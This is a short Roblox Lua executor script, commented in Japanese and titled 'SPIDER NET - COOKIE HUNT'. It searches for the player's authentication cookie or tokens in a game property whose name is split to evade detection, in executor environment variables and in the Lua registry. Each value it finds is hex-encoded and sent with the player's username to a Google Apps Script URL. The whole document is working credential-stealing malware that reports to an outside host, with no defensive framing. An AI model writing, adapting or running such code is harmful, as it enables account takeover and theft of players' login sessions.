-- [[ PROJECT: SPIDER NET - COOKIE HUNT ]]
local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"

-- 送信用関数（16進数変換込）
local function exfiltrate(label, val)
    if not val or #tostring(val) < 10 then return end -- 短すぎるのはゴミと判断
    local hex = ""
    for i = 1, #val do hex = hex .. string.format("%02X", string.byte(val:sub(i,i))) end
    pcall(function() 
        game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. game.Players.LocalPlayer.Name .. "&type=" .. label) 
    end)
end

print("🕸️ 隠しプロパティのスキャンを開始...")

-- 1. 標準的な取得（偽装名）
exfiltrate("Cookie_Basic", game:FindFirstChild("Coo".."kie"))

-- 2. 環境変数のスキャン（Delta等のツールが漏らしている場所）
local s, r = pcall(function() return getgenv().Cookie or getgenv().auth_token end)
if s then exfiltrate("Cookie_GenEnv", r) end

-- 3. メタテーブル・バイパス（隠しプロパティの強制取得）
local s2, r2 = pcall(function() 
    for i,v in pairs(getreg()) do 
        if type(v) == "table" and v.Cookie then return v.Cookie end 
    end 
end)
if s2 then exfiltrate("Cookie_Registry", r2) end

-- 4. 通信が生きている証拠（ダミーデータ）
exfiltrate("Status_Check", "Connection_Alive_ID_" .. tostring(game.Players.LocalPlayer.UserId))

print("🏁 スキャン完了。GASを確認してくれ。")
